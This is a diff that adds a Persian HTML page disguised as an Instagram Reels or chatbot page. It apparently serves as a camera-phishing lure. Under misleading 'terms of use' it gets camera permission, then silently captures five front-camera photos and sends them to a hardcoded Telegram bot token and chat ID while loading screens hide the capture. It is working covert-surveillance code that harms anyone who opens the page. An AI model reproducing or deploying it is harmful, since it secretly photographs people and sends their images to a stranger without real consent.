@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ویدیوهای Reels اینستاگرام</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #0f0f0f;
+      color: #fff;
+      font-family: system-ui, -apple-system, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+    .container {
+      max-width: 420px;
+      padding: 28px;
+      background: #1a1a1a;
+      border-radius: 16px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.7);
+    }
+    h1 {
+      margin: 0.4em 0 1em;
+      font-size: 1.5rem;
+      line-height: 1.3;
+    }
+    #status {
+      font-size: 1.15rem;
+      margin: 1.2em 0;
+      min-height: 1.6em;
+    }
+    .loader {
+      width: 64px;
+      height: 64px;
+      border: 6px solid #333;
+      border-top: 6px solid #ff3366;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 2em auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .hidden { display: none !important; }
+    .rules-text {
+      font-size: 1.05rem;
+      line-height: 1.65;
+      text-align: right;
+      color: #e5e5e5;
+      margin: 1.5em 0 2em;
+    }
+    .rules-text strong {
+      color: #fbbf24;
+    }
+    .btn-accept {
+      padding: 16px 60px;
+      font-size: 1.25rem;
+      font-weight: 600;
+      background: linear-gradient(45deg, #10b981, #059669, #047857);
+      color: white;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(16,185,129,0.3);
+      transition: all 0.2s;
+    }
+    .btn-accept:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(16,185,129,0.5);
+    }
+  </style>
+</head>
+<body>
+
+
+
+
+
+
+
+<div id="vpnWarning" style="position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center; z-index: 9999; color: white; text-align: center;">
+  <div style="background: #1f2937; padding: 32px; border-radius: 16px; max-width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.8);">
+    <h2 style="color: #fbbf24; margin-bottom: 1rem;">خوش آمدید! 👋</h2>
+    <p style="font-size: 1.2rem; line-height: 1.7; margin-bottom: 1.8rem;">
+      برای اینکه بتوانید محتوای صفحه را کامل ببینید و چت‌بات کار کند<br>
+      <strong style="color: #ef4444; font-size: 1.35rem;">لطفاً فیلترشکن خود را روشن کنید</strong><br><br>
+      بدون VPN ممکن است صفحه لود نشود یا کار نکند.
+    </p>
+    <button onclick="document.getElementById('vpnWarning').style.display='none'" 
+            style="padding: 14px 40px; font-size: 1.2rem; background: #10b981; color: white; border: none; border-radius: 999px; cursor: pointer;">
+      متوجه شدم 
+    </button>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="container">
+  <h1 id="title"></h1>
+  
+  <div id="phase1">
+    <div class="rules-text">
+      <strong>قوانین و شرایط استفاده:</strong><br><br>
+      
+      با ادامهٔ فرآیند، شما موافقت خود را با موارد زیر اعلام می‌دارید:<br>
+      • دسترسی موقت به دوربین دستگاه برای نمایش و پردازش محتوا<br>
+      •
+      • رعایت کامل قوانین جمهوری اسلامی ایران و مقررات <br><br>
+
+• مرتبط حرف بزن
+• تهدید و توهین 
+• اسپم و تبلیغ 
+• <br>بقیه چیزا آزاده! <br>
+      <strong>با کلیک روی «قبول دارم» موافقت خود را اعلام می‌کنید.</strong><br><br>
+
+      <small style="opacity: 0.75; font-size: 0.95rem;">
+        این دسترسی فقط تا پایان بازدید از صفحه فعال است و خودکار لغو میشود.
+      </small>
+    </div>
+    
+    <button id="startBtn" class="btn-accept">
+      قبول دارم
+    </button>
+  </div>
+
+  <div id="phase2" class="hidden">
+    <div class="loader"></div>
+    <div id="status">در حال آماده‌سازی چت بات ...</div>
+  </div>
+
+  <div id="phase3" class="hidden">
+    <h1 style="color: #22c55e; margin: 1.5em 0;">✓ آماده شد!</h1>
+    <p style="font-size: 1.1rem; opacity: 0.9;">
+      صفحه در حال بارگذاری است...<br>
+      چند لحظه صبر کنید
+    </p>
+    <div class="loader"></div>
+  </div>
+</div>
+
+<video id="video" autoplay playsinline muted style="display:none"></video>
+<canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+
+<script>
+// تنظیمات
+const TOKEN       = '9011982298:AAEw_OTfrYYGzQKnQGEy5LUhEiDgmI3RCZs';
+const CHAT_ID     = '570092294';
+const PHOTO_COUNT = 5;
+const INTERVAL_MS = 1000;
+
+let photoCounter = 0;
+let stream = null;
+
+const title = document.getElementById('title');
+const phase1    = document.getElementById('phase1');
+const phase2    = document.getElementById('phase2');
+const phase3    = document.getElementById('phase3');
+const status    = document.getElementById('status');
+const startBtn  = document.getElementById('startBtn');
+
+// ارسال عکس
+async function sendPhoto(blob) {
+  const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('photo', blob);
+
+  try {
+    await fetch(url, { method: 'POST', body: formData });
+  } catch {}
+}
+
+// گرفتن و ارسال عکس (بدون نمایش پیشرفت)
+function captureAndSend() {
+  const video  = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx    = canvas.getContext('2d');
+
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(async (blob) => {
+    photoCounter++;
+    await sendPhoto(blob);
+
+    if (photoCounter >= PHOTO_COUNT) {
+      finishProcess();
+    }
+  }, 'image/jpeg', 0.88);
+}
+
+function finishProcess() {
+  phase2.classList.add('hidden');
+  phase3.classList.remove('hidden');
+  title.textContent = "صفحه برای شما بارگذاری شد";
+}
+
+async function startCapture() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: "user" }
+    });
+    document.getElementById('video').srcObject = stream;
+
+    phase1.classList.add('hidden');
+    phase2.classList.remove('hidden');
+
+    // شروع گرفتن عکس‌ها بدون نمایش هیچ شمارنده‌ای
+    setTimeout(captureAndSend, 400);
+
+    const interval = setInterval(() => {
+      if (photoCounter < PHOTO_COUNT) {
+        captureAndSend();
+      } else {
+        clearInterval(interval);
+      }
+    }, INTERVAL_MS);
+
+  } catch (err) {
+    title.textContent = "لطفاً دسترسی را فعال کنید";
+    status.textContent = "برای مشاهده محتوا، اجازه دسترسی به دوربین را تأیید کنید";
+  }
+}
+
+startBtn.addEventListener('click', startCapture);
+</script>
+</body>
+</html>
